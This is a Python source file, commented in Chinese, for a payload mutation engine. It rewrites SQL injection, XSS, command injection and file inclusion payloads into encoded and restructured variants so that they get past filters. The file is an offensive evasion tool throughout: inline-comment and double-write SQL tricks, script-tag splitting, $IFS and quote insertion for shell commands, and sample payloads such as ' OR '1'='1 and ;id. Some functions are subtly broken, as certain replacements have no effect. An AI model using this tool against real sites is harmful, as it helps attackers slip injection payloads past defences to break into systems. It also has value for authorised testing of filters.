#!/usr/bin/env python3
"""
Payload 变异引擎
将基础 payload 进行多种变异生成变异 payload 列表，
支持编码变异（URL/双重URL/HTML实体/Unicode/Base64）和结构变异
（大小写/注释/空格/换行/嵌套），支持自定义变异规则。
"""

import argparse
import base64
import json
import os
import random
import sys


# ============================================================
# 编码变异函数
# ============================================================

def url_encode(payload):
    """URL 编码变异"""
    return "".join("%{:02X}".format(ord(c)) if not c.isalnum() else c for c in payload)


def url_full_encode(payload):
    """全量 URL 编码（所有字符编码）"""
    return "".join("%{:02X}".format(ord(c)) for c in payload)


def url_double_encode(payload):
    """双重 URL 编码"""
    first_pass = url_full_encode(payload)
    return "".join("%25{:02X}".format(ord(c)) if c == "%" else c for c in first_pass)


def html_entity_encode(payload):
    """HTML 实体编码（十进制）"""
    return "".join("&#{};".format(ord(c)) for c in payload)


def html_hex_entity_encode(payload):
    """HTML 实体编码（十六进制）"""
    return "".join("&#x{:02x};".format(ord(c)) for c in payload)


def unicode_encode(payload):
    """Unicode 编码"""
    return "".join("\\u{:04x}".format(ord(c)) for c in payload)


def base64_encode(payload):
    """Base64 编码"""
    return base64.b64encode(payload.encode("utf-8")).decode("ascii")


def hex_encode(payload):
    """Hex 编码"""
    return "0x" + payload.encode("utf-8").hex()


def char_encode(payload):
    """CHAR() 编码（MySQL 风格）"""
    return "CHAR({})".format(",".join(str(ord(c)) for c in payload))


# ============================================================
# 结构变异函数
# ============================================================

def case_random(payload):
    """随机大小写变异"""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in payload)


def case_upper(payload):
    """全大写"""
    return payload.upper()


def case_lower(payload):
    """全小写"""
    return payload.lower()


def case_alternate(payload):
    """交替大小写"""
    result = []
    for i, c in enumerate(payload):
        if i % 2 == 0:
            result.append(c.upper())
        else:
            result.append(c.lower())
    return "".join(result)


def comment_insert(payload):
    """注释插入变异（SQL 适用）"""
    keywords = ["UNION", "SELECT", "AND", "OR", "FROM", "WHERE", "ORDER"]
    result = payload
    for kw in keywords:
        lower_kw = kw.lower()
        if kw in result:
            mid = len(kw) // 2
            result = result.replace(kw, kw[:mid] + "/**/" + kw[mid:])
        if lower_kw in result:
            mid = len(lower_kw)
            result = result.replace(lower_kw, lower_kw[:mid // 2] + "/**/" + lower_kw[mid // 2:])
    return result


def inline_comment(payload):
    """内联注释变异"""
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        if kw in result:
            result = result.replace(kw, "/*!50000{}*/".format(kw))
    return result


def space_replace_tab(payload):
    """空格替换为 Tab"""
    return payload.replace(" ", "\t").replace(" ", "%09")


def space_replace_newline(payload):
    """空格替换为换行"""
    return payload.replace(" ", "\n").replace(" ", "%0a")


def space_replace_comment(payload):
    """空格替换为注释"""
    return payload.replace(" ", "/**/")


def space_replace_plus(payload):
    """空格替换为加号"""
    return payload.replace(" ", "+")


def double_write(payload):
    """双重写变异（SQL 适用）"""
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        if kw in result:
            result = result.replace(kw, kw + kw[1:] if len(kw) > 1 else kw + kw)
            # 正确的双写：UNUNIONION
            result = result.replace(kw + kw[1:], kw[0] + kw + kw)
    return result


def nest_parentheses(payload):
    """括号嵌套变异"""
    # 在关键字周围添加括号
    keywords = ["UNION", "SELECT"]
    result = payload
    for kw in keywords:
        if kw in result:
            result = result.replace(kw, "({})".format(kw))
    return result


def xss_tag_mutate(payload):
    """XSS 标签变异"""
    mutations = [
        payload.replace("<script>", "<scr<script>ipt>"),
        payload.replace("<script>", "<ScRiPt>"),
        payload.replace("<script>", "<script/*>"),
        payload.replace("alert", "alert/*"),
        payload.replace(">", "/>"),
    ]
    return random.choice(mutations)


def xss_event_replace(payload):
    """XSS 事件处理器替换"""
    event_map = {
        "onerror": ["onerror", "onErRoR", "ONERROR"],
        "onload": ["onload", "OnLoAd", "ONLOAD"],
        "onfocus": ["onfocus", "OnFoCuS", "ONFOCUS"],
        "onclick": ["onclick", "OnClIcK", "ONCLICK"],
    }
    result = payload
    for event, replacements in event_map.items():
        if event in result.lower():
            result = result.replace(event, random.choice(replacements))
    return result


def rce_ifs_replace(payload):
    """命令注入 $IFS 替换空格"""
    return payload.replace(" ", "${IFS}").replace(" ", "$IFS")


def rce_quote_insert(payload):
    """命令注入引号插入"""
    result = []
    for c in payload:
        if c.isalpha() and random.random() > 0.7:
            result.append("''" + c + "''")
        else:
            result.append(c)
    return "".join(result)


def rce_backslash(payload):
    """命令注入反斜杠分割"""
    result = []
    for c in payload:
        if c.isalpha() and random.random() > 0.6:
            result.append("\\" + c)
        else:
            result.append(c)
    return "".join(result)


# ============================================================
# 变异规则注册表
# ============================================================

ENCODING_MUTATIONS = {
    "url": url_encode,
    "url_full": url_full_encode,
    "url_double": url_double_encode,
    "html_entity": html_entity_encode,
    "html_hex": html_hex_entity_encode,
    "unicode": unicode_encode,
    "base64": base64_encode,
    "hex": hex_encode,
    "char": char_encode,
}

STRUCTURE_MUTATIONS = {
    "case_random": case_random,
    "case_upper": case_upper,
    "case_lower": case_lower,
    "case_alternate": case_alternate,
    "comment_insert": comment_insert,
    "inline_comment": inline_comment,
    "space_tab": space_replace_tab,
    "space_newline": space_replace_newline,
    "space_comment": space_replace_comment,
    "space_plus": space_replace_plus,
    "double_write": double_write,
    "nest_parens": nest_parentheses,
}

# 漏洞类型专用变异
VULN_SPECIFIC_MUTATIONS = {
    "sqli": ["comment_insert", "inline_comment", "double_write", "nest_parens", "case_random"],
    "xss": ["xss_tag_mutate", "xss_event_replace"],
    "rce": ["rce_ifs_replace", "rce_quote_insert", "rce_backslash"],
    "lfi": ["case_random", "space_tab", "space_newline"],
}


def mutate_payload(payload, vuln_type, max_mutations=20):
    """对 payload 进行多种变异，返回变异列表"""
    mutations = []
    seen = set()

    # 收集可用的变异函数
    available_mutations = list(STRUCTURE_MUTATIONS.keys())
    # 添加漏洞类型专用变异
    specific = VULN_SPECIFIC_MUTATIONS.get(vuln_type, [])
    for s in specific:
        if s not in available_mutations:
            available_mutations.append(s)

    # 编码变异
    for enc_name, enc_func in ENCODING_MUTATIONS.items():
        available_mutations.append(enc_name)

    # 获取变异函数映射
    all_mutations = {}
    all_mutations.update(STRUCTURE_MUTATIONS)
    all_mutations.update(ENCODING_MUTATIONS)
    # 添加漏洞专用变异函数
    if vuln_type == "xss":
        all_mutations["xss_tag_mutate"] = xss_tag_mutate
        all_mutations["xss_event_replace"] = xss_event_replace
    elif vuln_type == "rce":
        all_mutations["rce_ifs_replace"] = rce_ifs_replace
        all_mutations["rce_quote_insert"] = rce_quote_insert
        all_mutations["rce_backslash"] = rce_backslash

    # 随机打乱变异顺序
    random.shuffle(available_mutations)

    for mut_name in available_mutations:
        if len(mutations) >= max_mutations:
            break
        func = all_mutations.get(mut_name)
        if not func:
            continue
        try:
            mutated = func(payload)
            if mutated and mutated != payload and mutated not in seen:
                seen.add(mutated)
                mutations.append({
                    "mutation_type": mut_name,
                    "original": payload,
                    "mutated": mutated,
                })
        except Exception:
            continue

    # 组合变异：编码 + 结构
    if len(mutations) < max_mutations:
        enc_names = list(ENCODING_MUTATIONS.keys())
        struct_names = [s for s in STRUCTURE_MUTATIONS if s in VULN_SPECIFIC_MUTATIONS.get(vuln_type, [])]
        if not struct_names:
            struct_names = list(STRUCTURE_MUTATIONS.keys())
        for _ in range(max_mutations - len(mutations)):
            enc_name = random.choice(enc_names)
            struct_name = random.choice(struct_names)
            try:
                step1 = STRUCTURE_MUTATIONS[struct_name](payload)
                step2 = ENCODING_MUTATIONS[enc_name](step1)
                if step2 and step2 not in seen:
                    seen.add(step2)
                    mutations.append({
                        "mutation_type": "combined_{}_{}".format(struct_name, enc_name),
                        "original": payload,
                        "mutated": step2,
                    })
            except Exception:
                continue

    return mutations[:max_mutations]


def main():
    parser = argparse.ArgumentParser(
        description="Payload 变异引擎 - 生成多种编码和结构变异",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "示例:\n"
            "  %(prog)s --payload \"' OR '1'='1\" --type sqli --mutations 20\n"
            "  %(prog)s --payload \"<script>alert(1)</script>\" --type xss --mutations 30 --output result.json\n"
            "  %(prog)s --payload \";id\" --type rce --mutations 15\n"
            "\n支持类型: sqli, xss, rce, lfi\n"
            "变异类型: url, url_full, url_double, html_entity, html_hex, unicode, base64, hex, char,\n"
            "         case_random, case_upper, case_lower, case_alternate, comment_insert, inline_comment,\n"
            "         space_tab, space_newline, space_comment, space_plus, double_write, nest_parens"
        ),
    )
    parser.add_argument("--payload", required=True, help="基础 payload")
    parser.add_argument("--type", required=True, choices=["sqli", "xss", "rce", "lfi"], help="漏洞类型")
    parser.add_argument("--mutations", type=int, default=20, help="生成变异数量（默认 20）")
    parser.add_argument("--output", "-o", help="结果保存文件路径（可选）")
    args = parser.parse_args()

    # 认证模块导入
    try:
        sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "exploit"))
        from red_team_auth import require_auth
        require_auth()
    except ImportError:
        pass

    try:
        mutations = mutate_payload(args.payload, args.type, args.mutations)
        result = {
            "original_payload": args.payload,
            "vuln_type": args.type,
            "total_mutations": len(mutations),
            "mutations": mutations,
        }
        json_output = json.dumps(result, ensure_ascii=False, indent=2)
        if args.output:
            try:
                with open(args.output, "w", encoding="utf-8") as f:
                    f.write(json_output)
                print("结果已保存到: {}".format(args.output))
            except IOError as e:
                print(json.dumps({"error": "写入文件失败: {}".format(e)}), file=sys.stderr)
                print(json_output)
        else:
            print(json_output)
    except Exception as e:
        print(json.dumps({"error": "变异失败: {}".format(e)}), file=sys.stderr)
        sys.exit(1)


if __name__ == "__main__":
    main()
